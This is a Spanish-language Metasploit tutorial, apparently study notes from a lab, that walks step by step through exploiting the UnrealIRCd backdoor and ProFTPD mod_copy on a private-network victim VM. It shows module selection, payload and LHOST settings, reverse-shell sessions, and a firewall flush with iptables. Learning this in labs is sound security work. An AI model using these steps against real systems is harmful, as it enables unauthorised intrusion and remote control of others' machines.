# Metasploit (Explotación básica)

Si nos metemos dentro de `metasploit` y ejecutamos `help` podremos ver todas las opciones que tiene este `framework`, al ser una herramienta tan completa tendra muchisimas opciones.

El comando que mas vamos a utilizar en `metasploit` es `search` ya que utiliza una serie de cosas, para filtrarte la informacion que estas buscando respecto al `exploit` a decuado.

```shell
search unrealirc
```

Info:

```
Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/irc/unreal_ircd_3281_backdoor
```

Y nos devolveria que en este caso solo hay un `exploit`, nos dice tambien que es un `exploit` que funciona `excellent` por lo que nos asegura sus fallos de que pase algo son minimos y en el `Check` nos pone que `no`, por lo que no nos asegura que las opciones que le implementemos nosotros como atacante funcione adecadamente o no.

Si queremos utilizar el `exploit` podremos hacerlo de la siguiente forma:

> OPCION 1

```shell
use exploit/unix/irc/unreal_ircd_3281_backdoor
```

> OPCION 2

```shell
use 0
```

La `opcion 2` va a variar dependiendo de cuantos `exploits` se muestre y seleccionaremos con el numero de posicion en la que este para utilizarlo.

Una vez echo lo aneterior estaremos dentro del `exploit` viendo algo tal que asi:

```
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) >
```

Y ya dentro del `exploit` tocaria configurarlo para probarlo contra la maquina victima, si por ejemplo queremos salirnos del `exploit` para volver atras y buscar otra cosa, lo haremos con el comando `back`.

Dentro de este `framework` encontramos diferentes `modulos`:

`auxiliares` = Son los que nos ayudan a un descubrimiento/reconocimiento activo, o a la tarea de explotacion tambien.

`Exploits` = Codigos que nos permiten aprovechar una vulnerabilidad.

`Payloads` = Conjunto de `payloads` que vamos a utilizar con los `exploits`.

Entonces volviendo al `exploit` en el que nos habiamos metido antes:

```
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) >
```

Tendremos que configurarlo para que funcione.

Si ejecutamos:

```shell
show options
```

Podremos ver que opciones tiene este `exploit` para configurarlo.

```
Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    6667             yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.
```

Si queremos que nos muestre opciones mas avanzadas sobre el `exploit` podremos poner lo siguiente:

```shell
show advanced
```

Pero con la normal nos sirve, ya que son las opciones necesarias para que el `exploit` pueda funcionar.

Ahora en las opciones vemos que hay algunas vacias las cuales tendremos que rellenar nosotros estableciendolo con el comando `set`, de la siguiente forma:

```shell
set RHOSTS 192.168.16.129
```

Y si ahora volvemos a poner `show options` podremos ver como se establecio correctamente la opcion del `RHOSTS`.

Antes de ejecutarlo, tendremos que seleccionar el `payload` necesario para este `exploit` y eso podremos hacerlo mirando cuales nos ofrece `metasploit` en este `exploit` de la siguiente forma:

```shell
show payloads
```

Info:

```
Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   payload/cmd/unix/adduser                                     normal  No     Add user with useradd
   1   payload/cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP (via Perl)
   2   payload/cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
   3   payload/cmd/unix/bind_ruby                                   normal  No     Unix Command Shell, Bind TCP (via Ruby)
   4   payload/cmd/unix/bind_ruby_ipv6                              normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
   5   payload/cmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution
   6   payload/cmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP (telnet)
   7   payload/cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
   8   payload/cmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP (via Perl)
   9   payload/cmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
   10  payload/cmd/unix/reverse_ruby                                normal  No     Unix Command Shell, Reverse TCP (via Ruby)
   11  payload/cmd/unix/reverse_ruby_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
   12  payload/cmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)
```

En mi caso el que puede funcionar de forma generica y que esta muy bien es el numero `6` el llamado tambien como `payload/cmd/unix/reverse`, por lo que lo seleccionaremos haciendo lo siguiente:

```shell
set payload payload/cmd/unix/reverse
```

Si hacemos un `show options` veremos que se establecio correctamente, pero ahora este `payload` nos pide que pongamos nuestra IP a donde queremos que nos llegue dicha conexion con el puerto tambien:

```
Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

```

Por lo que lo estableceremos de la siguiente forma:

```shell
set LHOST 192.168.16.128
```

El puerto no hace falta cambiarlo, si diera algun error, se podria cambiar por si acaso, pero de momento se queda con esta configuracion basica.

Solo le tendremos que dar a `exploit` y esto se ejecutara, para poder conseguir la `reverse shell` de la maquina victima.

Info:

```
[*] Started reverse TCP double handler on 192.168.16.128:7777 
[*] 192.168.16.129:6667 - Connected to 192.168.16.129:6667...
    :irc.TestIRC.net NOTICE AUTH :*** Looking up your hostname...
[*] 192.168.16.129:6667 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo bNSMWa0nPcQzxgVU;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "bNSMWa0nPcQzxgVU\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (192.168.16.128:7777 -> 192.168.16.129:40602) at 2024-11-14 04:16:40 -0500
```

Con esto obtendremos una `shell` que no se ve el `prompt` pero si puedo ejecutar comandos en el sistema y ver lo que nos devuelve.

> NOTA IMPORTANTE:

Si no va el `exploit` y no te devuelve una shell, puede ser por los permisos de `firewall` del `iptables` de la maquina victima `Linux`, por lo que tendremos que poner el siguiente comando:

```shell
sudo iptables -F
```

Y con esto se borraran todas las reglas `firewall`.

Ahora saldremos de la `shell` con `Ctrl+C` dandole a `y` para abortar la sesion y pondremos `back` para salirnos del `exploit`, probaremos con otra vulnerabilidad que vimos anteriormente del `FTP`.

```shell
search proftpd
```

Info:

```
Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/linux/misc/netsupport_manager_agent  2011-01-08       average    No     NetSupport Manager Agent Remote Buffer Overflow
   1  exploit/linux/ftp/proftp_sreplace            2006-11-26       great      Yes    ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
   2  exploit/freebsd/ftp/proftp_telnet_iac        2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
   3  exploit/linux/ftp/proftp_telnet_iac          2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
   4  exploit/unix/ftp/proftpd_modcopy_exec        2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution
   5  exploit/unix/ftp/proftpd_133c_backdoor       2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution


Interact with a module by name or index. For example info 5, use 5 or use exploit/unix/ftp/proftpd_133c_backdoor
```

Vemos que hay unas cuantas, pero en concreto elegiremos el numero `4` que se llama `exploit/unix/ftp/proftpd_modcopy_exec` ya que en la version pone que es la `1.3.5` que es justo la version que vimos en la maquina victima, por eso elegimos ese.

```shell
use exploit/unix/ftp/proftpd_modcopy_exec
```

Una vez estando dentro del `exploit`, nos pondra un mensaje que es el siguiente:

```
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
```

Nos esta diciendo que ya viene un `payload` configurado por defecto, pero que se lo podremos cambiar de forma manual, en algunos `exploits` viene por defecto y no hace falta cambiarlos y en otros si.

Una vez estemos dentro del `exploit`, tendremos que configurarlo de la siguiente forma:

```shell
set RHOSTS 192.168.16.129
set SITEPATH /var/www/html
```

Vamos a ponerte en el `SITEPATH` esa ruta ya que viene por defecto hasta el `www` y puede ser que no tenga permisos de escritura el usuario que lo este ejecutando en la maquina, por lo que para asegurar lo haremos de esa forma, ya que lo que va a injectar es un archivo para podernos crear una `reverse shell`.

```shell
show payloads
```

Y elegiremos el siguiente:

```shell
set payload payload/cmd/unix/reverse_perl
```

Despues configuramos con nuestra IP:

```shell
set LHOST 192.168.16.128
```

Y lo ejecutamos poniendo `exploit`.

```
[*] Started reverse TCP handler on 192.168.16.128:4455 
[*] 192.168.16.129:80 - 192.168.16.129:21 - Connected to FTP server
[*] 192.168.16.129:80 - 192.168.16.129:21 - Sending copy commands to FTP server
[*] 192.168.16.129:80 - Executing PHP payload /rJIMs.php
[+] 192.168.16.129:80 - Deleted /var/www/html/rJIMs.php
[*] Command shell session 3 opened (192.168.16.128:4455 -> 192.168.16.129:41546) at 2024-11-14 04:35:04 -0500

whoami
www-data
```
